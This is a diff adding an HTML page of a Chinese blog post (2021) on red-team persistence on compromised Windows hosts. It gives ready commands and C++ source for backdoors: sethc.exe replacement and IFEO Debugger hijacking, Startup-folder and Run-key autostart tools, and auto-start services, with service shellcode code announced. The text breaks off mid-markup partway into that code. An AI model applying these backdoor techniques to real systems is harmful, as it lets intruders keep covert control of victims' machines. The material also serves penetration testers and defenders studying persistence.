@@ -1,0 +1,665 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/kd.png">
+  <link rel="icon" href="/img/kd.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>SD</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"sd-xd.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>blog of SD</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-31 16:46" pubdate>
+        2021年8月31日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      61
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>红队人员拿到一台主机权限后首先会考虑将该机器作为一个持久化的据点，种植一个具备持久化的后门，从而随时可以连接该被控机器进行深入渗透。通俗的说抓到一条鱼,不能轻易放走了。</p>
+<h1 id="0x02-辅助功能镜像劫持"><a href="#0x02-辅助功能镜像劫持" class="headerlink" title="0x02 辅助功能镜像劫持"></a>0x02 辅助功能镜像劫持</h1><p> 为了使电脑更易于使用和访问，Windows 添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。</p>
+<p>比如最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序</p>
+<p>还有:</p>
+<ul>
+<li>屏幕键盘： C:\Windows\System32\osk.exe</li>
+<li>放大镜： C:\Windows\System32\Magnify.exe</li>
+<li>旁白： C:\Windows\System32\Narrator.exe</li>
+<li>显示切换器 C:\Windows\System32\DisplaySwitch.exe</li>
+<li>应用切换器： C:\Windows\System32\AtBroker.exe</li>
+</ul>
+<p>在较早的 Windows 版本，只需要进行简单的二进制文件替换，比如经典的shift后门是将C:\Windows\System32\sethc.exe替换为cmd.exe。</p>
+<h2 id="windows-2003，xp"><a href="#windows-2003，xp" class="headerlink" title="windows 2003，xp"></a>windows 2003，xp</h2><p>可以可视化界面更换也可以命令行:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">copy c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\s</span>ethc.ex c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\s</span>ethc1.exe<br>copy c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\s</span>ethc.exe<br></code></pre></td></tr></table></figure>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/2.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="更高版本"><a href="#更高版本" class="headerlink" title="更高版本"></a>更高版本</h2><p>我们需要用到IFEO,即映像劫持</p>
+<h3 id="什么是IFEO"><a href="#什么是IFEO" class="headerlink" title="什么是IFEO"></a>什么是IFEO</h3><p>所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</p>
+<p>当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序。</p>
+<h3 id="可视化修改"><a href="#可视化修改" class="headerlink" title="可视化修改"></a>可视化修改</h3><p>在iexplorer.exe中加入键值对:debugger c:\windows\system32\cmd.exe</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/3.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="命令行修改"><a href="#命令行修改" class="headerlink" title="命令行修改"></a>命令行修改</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\i</span>explore.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot; /f<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然,需要管理员权限</p>
+<h1 id="0x03-启动项-服务后门"><a href="#0x03-启动项-服务后门" class="headerlink" title="0x03 启动项/服务后门"></a>0x03 启动项/服务后门</h1><h2 id="开始菜单启动项"><a href="#开始菜单启动项" class="headerlink" title="开始菜单启动项"></a>开始菜单启动项</h2><p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\S</span>D<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartup<br></code></pre></td></tr></table></figure>
+
+<p>相关键值</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\E</span>xplorer<span class="hljs-symbol">\U</span>ser   Shell Folders <br>HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\E</span>xplorer<span class="hljs-symbol">\S</span>hell   Folders <br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\E</span>xplorer<span class="hljs-symbol">\S</span>hell   Folders <br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\E</span>xplorer<span class="hljs-symbol">\U</span>ser   Shell Folders<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/5.png" srcset="/img/loading.gif" lazyload></p>
+<p> 重启后自启</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>由于每台电脑的快速启动目录不同,可以代码实现</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>   <span class="hljs-meta-string">&lt;shlobj.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>   comment(lib, <span class="hljs-meta-string">&quot;shell32.lib&quot;</span>)</span><br><br><span class="hljs-function">BOOL <span class="hljs-title">AutoRun_Startup</span><span class="hljs-params">(CHAR* lpszSrcFilePath, CHAR* lpszDestFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>    BOOL ret = <span class="hljs-literal">false</span>;<br>    CHAR szStartPath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    CHAR szDestFilePath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-comment">//返回快速启动目录路径到szStartPath</span><br>    ret = ::<span class="hljs-built_in">SHGetSpecialFolderPathA</span>(<span class="hljs-literal">NULL</span>, szStartPath,CSIDL_STARTUP,TRUE);<br>    <span class="hljs-comment">//判断是否获取成功</span><br>    <span class="hljs-keyword">if</span> (ret == TRUE)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Get the quick start directory successfully！\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!]Get the quick start directory faild！\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//构造文件在快速启动目录下的路径</span><br>    ::<span class="hljs-built_in">wsprintfA</span>(szDestFilePath,<span class="hljs-string">&quot;%s\\%s&quot;</span>,szStartPath,lpszDestFileName);<br>    <span class="hljs-comment">//复制文件到快速启动目录下</span><br>    ret = ::<span class="hljs-built_in">CopyFileA</span>(lpszSrcFilePath, szDestFilePath, FALSE);<br>    <span class="hljs-keyword">if</span> (FALSE == ret)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!]Failed to save the file in the quick start directory.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!]Successfully to save the file in the quick start directory.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Backdoor generation in quick start directory successful!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Useage:\n    %s %s %s\n&quot;</span>, <span class="hljs-string">&quot;Run_StartUp.exe&quot;</span>, <span class="hljs-string">&quot;E:\\010Editor\\010 Editor\\010Editor.exe&quot;</span>, <span class="hljs-string">&quot;010Editor.exe&quot;</span>);<br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">AutoRun_Startup</span>(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!]Please check the number of your parameters\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/7.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="启动项注册表后门"><a href="#启动项注册表后门" class="headerlink" title="启动项注册表后门"></a>启动项注册表后门</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br>HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<br></code></pre></td></tr></table></figure>
+
+<p>值得注意的是,HKEY_CURRENT_USER的改动不需要管理员权限</p>
+<p>自己写的一个小工具</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>代码不多,也比较简单,还是分享出来：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;iostream&gt;<br>#<span class="hljs-keyword">include</span> &lt;windows.h&gt;<br><br>BOOL <span class="hljs-constructor">Reg_CurrentUser(<span class="hljs-params">const</span> <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">lpszFileName</span>,<span class="hljs-params">const</span> <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">lpszValueName</span>)</span><br>&#123;<br>    <span class="hljs-comment">//定义一个注册表句柄</span><br>    HKEY hKey;<br>    <span class="hljs-comment">//打开注册表键</span><br>    <span class="hljs-keyword">if</span> (ERROR_SUCCESS<span class="hljs-operator"> == </span>::<span class="hljs-constructor">RegOpenKeyEx(HKEY_CURRENT_USER, L<span class="hljs-string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, 0, KEY_WRITE, &amp;<span class="hljs-params">hKey</span>)</span>)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;[+] Open RegKey Successfully\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        printf(<span class="hljs-string">&quot;[!] Open RegKey Error\n&quot;</span>);<br>        return FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ERROR_SUCCESS<span class="hljs-operator"> == </span>::<span class="hljs-constructor">RegSetValueExA(<span class="hljs-params">hKey</span>, <span class="hljs-params">lpszValueName</span>, 0, REG_SZ, (BYTE<span class="hljs-operator">*</span>)</span>lpszFileName, (<span class="hljs-number">1</span> + ::lstrlen<span class="hljs-constructor">A(<span class="hljs-params">lpszFileName</span>)</span>)))<br>    &#123;<br>        printf(<span class="hljs-string">&quot;[+] Set Value Successfully\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        ::<span class="hljs-constructor">RegCloseKey(<span class="hljs-params">hKey</span>)</span>;<br>        printf(<span class="hljs-string">&quot;[!] Set Value Error\n&quot;</span>);<br>        return FALSE;<br>    &#125;<br>    printf(<span class="hljs-string">&quot;[+] The registry backdoor about HKEY_CURRENT_USER is generated successfully\n&quot;</span>);<br>    ::<span class="hljs-constructor">RegCloseKey(<span class="hljs-params">hKey</span>)</span>;<br>    return TRUE;<br>&#125;<br><br><span class="hljs-built_in">int</span> main(<span class="hljs-built_in">int</span> argc, <span class="hljs-built_in">char</span>* argv<span class="hljs-literal">[]</span>)<br>&#123;<br>    printf(<span class="hljs-string">&quot;[*]Useage:\n    %s %s %s\n&quot;</span>,<span class="hljs-string">&quot;ModifyReg.exe&quot;</span>,<span class="hljs-string">&quot;E:\\010Editor\\010 Editor\\010Editor.exe&quot;</span>, <span class="hljs-string">&quot;010Editor&quot;</span>);<br>    <span class="hljs-keyword">if</span> (argc<span class="hljs-operator"> == </span><span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-constructor">Reg_CurrentUser(<span class="hljs-params">argv</span>[1], <span class="hljs-params">argv</span>[2])</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        printf(<span class="hljs-string">&quot;[!]Please check the number of your parameters\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>而更改HKEY_LOCAL_MACHINE却是需要管理员权限</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>重启后exe会自启,不一定是cmd程序,可以换成我们自己的马,达到维持权限的效果</p>
+<h3 id="使用命令行"><a href="#使用命令行" class="headerlink" title="使用命令行"></a>使用命令行</h3><p>修改HKLM</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un   /v &quot;123&quot; /t REG_SZ /d &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot; /f<br></code></pre></td></tr></table></figure>
+
+<p>同样需要管理员权限,代码跟上面差不多<br><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/10.png" srcset="/img/loading.gif" lazyload></p>
+<p> HKEY_CURRENT_USER同理,但不需要管理员权限</p>
+<p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/11.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="自启动服务后门"><a href="#自启动服务后门" class="headerlink" title="自启动服务后门"></a>自启动服务后门</h2><p>在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。</p>
+<p>可以通过如下命令行方式添加一个服务</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>create <span class="hljs-string">&quot;SD&quot;</span> <span class="hljs-keyword">binpath= </span>  <span class="hljs-string">&quot;C:\Users\SD\Desktop\test.exe&quot;</span> <br><span class="hljs-keyword">sc </span>description <span class="hljs-string">&quot;SD&quot;</span>   <span class="hljs-string">&quot;description&quot;</span> 设置服务的描述字符串 <br><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> <span class="hljs-string">&quot;SD&quot;</span>   start= auto  设置这个服务为自动启动 <br>net start <span class="hljs-string">&quot;SD&quot;</span>   启动服务<br></code></pre></td></tr></table></figure>
+
+<p>也可以直接编写一个服务,穿插着shellcode上线</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 